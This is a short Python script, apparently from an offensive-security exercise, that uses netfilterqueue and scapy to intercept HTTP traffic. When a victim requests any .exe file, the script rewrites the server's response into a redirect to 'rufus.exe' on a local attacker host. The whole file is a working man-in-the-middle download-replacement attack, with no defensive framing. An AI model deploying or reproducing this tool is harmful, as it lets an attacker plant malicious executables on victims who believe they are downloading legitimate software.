#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

dict_list=[]
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load and "192.168.43.28" not in scapy_packet[scapy.Raw].load:
                dict_list.append(scapy_packet[scapy.TCP].ack)
                scapy_packet[scapy.TCP].seq in dict_list
                print("\n HTTP Request >>>")
                print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in dict_list:
                dict_list.remove(scapy_packet[scapy.TCP].seq)
                print("\n HTTP Response >>>")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.43.28/rufus.exe\n\n"
                
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                print(scapy_packet.show())
                packet.set_payload(str(scapy_packet))

    packet.accept()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
